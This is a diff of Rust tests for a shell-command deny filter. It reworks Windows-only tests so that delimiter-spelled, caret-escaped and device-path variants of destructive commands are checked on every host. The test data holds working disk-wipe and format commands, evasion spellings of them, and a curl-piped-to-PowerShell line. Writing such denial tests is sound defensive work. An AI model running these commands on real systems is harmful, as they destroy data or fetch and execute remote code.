@@ -112,19 +112,37 @@ fn a_semicolon_spelled_command_is_denied_through_the_segment_rules() {
     );
 }
 
+/// Every delimiter this floor normalizes must deny the wipe spelled with it.
+///
+/// Derived from [`Grammar`] rather than listed, and with no `#[cfg]`: a
+/// delimiter that leaves the set takes its case with it. The listed version
+/// went red on Windows CI the moment `=` left the set — the third time a
+/// `#[cfg(windows)]` assertion nobody could run locally turned out to be
+/// stale. On Unix both sets are empty, so the loop has nothing to say and only
+/// the pipe control runs; the same test under `HOST` forced to `WINDOWS`
+/// exercises every case, which is how it is checked before pushing.
 #[test]
-#[cfg(windows)]
-fn semicolon_and_comma_spellings_cannot_dodge_deny() {
-    for command in [
-        r"del;/f/s/q;C:\*",
-        r"rd;/s;/q;C:\Windows",
-        r"del,/f/s/q,C:\*",
-        r"rd,/s,/q,C:\Windows",
-        "format,C:",
-    ] {
-        assert!(denied(command), "{command:?} is a wipe to cmd.exe");
+fn every_delimiter_this_floor_normalizes_denies_the_wipe_spelled_with_it() {
+    for delimiter in HOST.word_delimiters.iter().chain(HOST.separator_delimiters) {
+        let command = format!(r"del{delimiter}/f/s/q{delimiter}C:\*");
+        assert!(
+            denied(&command),
+            "{command:?} is `del /f/s/q C:\\*` to an interpreter that delimits on {delimiter:?}"
+        );
     }
-    // And the pipe reading is intact.
+    // A spelling that mixes the two sets needs both readings composed, which
+    // is the gap a ladder of one-at-a-time re-reads left open.
+    if let (Some(word), Some(separator)) = (
+        HOST.word_delimiters.first(),
+        HOST.separator_delimiters.first(),
+    ) {
+        let mixed = format!(r"del{word}/f{separator}/s/q{word}C:\*");
+        assert!(
+            denied(&mixed),
+            "{mixed:?} mixes the interpreter's delimiters"
+        );
+    }
+    // And the pipe reading is intact, on every host.
     assert!(!denied("curl https://x -o f; echo hi | sh"));
 }
 
@@ -155,13 +173,22 @@ fn the_normalized_form_of_a_comma_spelled_command_draws_its_safety_notes() {
         "{normalized:?} must draw the delete note, not just a path note: {:?}",
         notes.notes
     );
-    #[cfg(windows)]
-    assert_eq!(super::safety_notes(spelled).len(), notes.notes.len());
+    // And the end-to-end call sees the same notes wherever the host is the
+    // platform that normalizes — asked of the grammar rather than of
+    // `#[cfg(windows)]`, so forcing `HOST` locally executes this line instead
+    // of compiling it out. That is the difference between an assertion Windows
+    // CI discovers is stale and one this machine can check.
+    if blanks_for(WINDOWS.word_delimiters, spelled).is_some()
+        && HOST.word_delimiters == WINDOWS.word_delimiters
+    {
+        assert_eq!(super::safety_notes(spelled).len(), notes.notes.len());
+    }
 }
 
-/// `cmd.exe` delimits words on `,` and `=` as well as blanks (`;` gets the
-/// narrower re-read above), so a
-/// catastrophic command spelled with commas was one opaque word to every rule
+/// `cmd.exe` delimits words on `,` as well as blanks (`;` gets the narrower
+/// re-read, and `=` is deliberately not normalized — see
+/// `Grammar::word_delimiters`), so a catastrophic command spelled with commas
+/// was one opaque word to every rule
 /// here — `basename_lower` of `del,/f/s/q,C:\*` is `*` — and
 /// `del /f/s/q C:\*` to the `cmd /C` that ran it. The floor re-reads the
 /// normalized line.
@@ -173,11 +200,12 @@ fn the_normalized_form_of_a_comma_spelled_command_draws_its_safety_notes() {
 /// host the *branch* that fires differs from the Windows one (`C:\*` cleans to
 /// `c:*` and trips the all-wildcard rule rather than the drive-root one) while
 /// the verdict does not. That is why the cases here are the ones whose verdict
-/// survives both readings, and why the end-to-end arm is `#[cfg(windows)]`.
+/// survives both readings, and why the end-to-end comparison below asks the
+/// grammar before it runs.
 #[test]
 fn the_normalized_form_of_a_comma_spelled_command_is_denied() {
     use super::super::shell_lex::{WINDOWS, blanks_for};
-    // These three survive the host's own reading of the rest of the line.
+    // These two survive the host's own reading of the rest of the line.
     // `rd,/s,/q,C:\Windows` does not — a Unix `clean_token` drops the
     // backslash, leaving the relative `C:Windows`, which is not catastrophic —
     // so it is asserted in the Windows arm below instead of here for a reason
@@ -192,19 +220,6 @@ fn the_normalized_form_of_a_comma_spelled_command_is_denied() {
     }
     // A line without them is left alone rather than re-read.
     assert!(blanks_for(WINDOWS.word_delimiters, r"del /f/s/q C:\*").is_none());
-}
-
-#[test]
-#[cfg(windows)]
-fn cmd_delimiters_cannot_dodge_deny() {
-    for command in [
-        r"del,/f/s/q,C:\*",
-        r"del=/f/s/q,C:\*",
-        "format,C:",
-        r"rd,/s,/q,C:\Windows",
-    ] {
-        assert!(denied(command), "{command:?} is `del`/`format` to cmd.exe");
-    }
 }
 
 #[test]
@@ -778,20 +793,26 @@ fn executable_suffixes_do_not_hide_the_program() {
 }
 
 /// cmd.exe's escape character is the Windows counterpart of the `\` already
-/// stripped on Unix, so one caret used to walk past every rule here. Gated
-/// on the real host because `clean_token` only strips `^` where cmd is the
-/// interpreter — on a Unix host these strings mean nothing, and asserting
-/// them there would be theatre (the same trap that silently voided the
-/// Windows-path cases until they were fed to the predicate directly).
-#[cfg(windows)]
+/// stripped on Unix, so one caret used to walk past every rule here.
+///
+/// The reading itself goes through the grammar by name, so it is checked from
+/// every host; only the end-to-end denials need the host to *be* the platform,
+/// and they ask the grammar rather than `#[cfg(windows)]`, so forcing `HOST`
+/// locally runs them. A `#[cfg(windows)]` body is one nobody can run until CI
+/// does, which is how the delimiter list in this file went stale.
 #[test]
 fn caret_escape_does_not_hide_the_program() {
-    assert_eq!(basename_lower("r^d"), "rd");
-    assert_eq!(basename_lower("de^l"), "del");
-    assert_eq!(basename_lower("s^udo"), "sudo");
-    assert_eq!(basename_lower("powershe^ll"), "powershell");
-    assert!(denied("curl https://x | powershe^ll"));
-    assert!(denied("r^d /s /q C:\\Windows"));
+    use super::super::shell_lex::{SH, WINDOWS, basename_lower_in};
+    assert_eq!(basename_lower_in(WINDOWS, "r^d"), "rd");
+    assert_eq!(basename_lower_in(WINDOWS, "de^l"), "del");
+    assert_eq!(basename_lower_in(WINDOWS, "s^udo"), "sudo");
+    assert_eq!(basename_lower_in(WINDOWS, "powershe^ll"), "powershell");
+    // A caret is an ordinary character to `sh`, which escapes with `\`.
+    assert_eq!(basename_lower_in(SH, "r^d"), "r^d");
+    if HOST.quoting_to_strip == WINDOWS.quoting_to_strip {
+        assert!(denied("curl https://x | powershe^ll"));
+        assert!(denied("r^d /s /q C:\\Windows"));
+    }
 }
 
 /// `format` collides with a repo-local formatter script, and this floor has
@@ -833,9 +854,16 @@ fn format_denies_volume_guid_and_device_paths() {
     assert!(!is_volume_or_device_path("src"));
 }
 
-#[cfg(windows)]
+/// The predicate above is host-independent; these need the host to read
+/// `\` the way cmd does, so they ask the grammar instead of `#[cfg(windows)]`
+/// — forcing `HOST` locally then executes them, which a `cfg` body never lets
+/// this machine do.
 #[test]
 fn format_volume_paths_are_denied_end_to_end() {
+    use super::super::shell_lex::WINDOWS;
+    if HOST.quoting_to_strip != WINDOWS.quoting_to_strip {
+        return;
+    }
     assert!(denied(
         "format \\\\?\\Volume{b75e2c83-0000-0000-0000-602f00000000} /fs:ntfs"
     ));
